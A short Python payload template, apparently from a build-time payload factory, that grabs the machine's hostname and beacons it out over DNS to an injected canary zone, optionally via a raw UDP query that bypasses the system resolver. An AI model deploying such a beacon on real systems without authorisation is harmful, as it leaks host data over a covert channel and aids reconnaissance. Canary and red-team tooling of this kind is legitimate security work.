#!/usr/bin/env python3
# hostname-beacon-dns payload — DNS (tier-0, signal-only) variant of hostname_grab.
#
# Injected by the factory at build time:
#   _ZONE         — DNS canary zone the beacon queries, e.g. "cb.example.com"
#   _TOKEN        — instance_token (16-char hex, 8 bytes)
#   _DNS_SERVER   — "host:port" to query directly via a raw UDP packet, bypassing the OS
#                   resolver. Local/test only (the zone usually isn't really delegated to the
#                   edge) — pass --set _DNS_SERVER= (empty) at forge time for a real deployment,
#                   where the OS resolver recurses to the edge through public DNS delegation.
#
# blacksea.sdk.payload.* is inlined by the bundler — pure stdlib, no third-party
# imports anywhere on this path (runs on any Python 3.11+, no project venv needed).
from blacksea.sdk.payload.dns import send_dns
import socket
import json

_hostname = socket.gethostname()
_body = json.dumps(
    {"hostname": _hostname}, sort_keys=True, separators=(",", ":")
).encode()
send_dns(_TOKEN, _ZONE, _body, _DNS_SERVER)  # noqa: F821
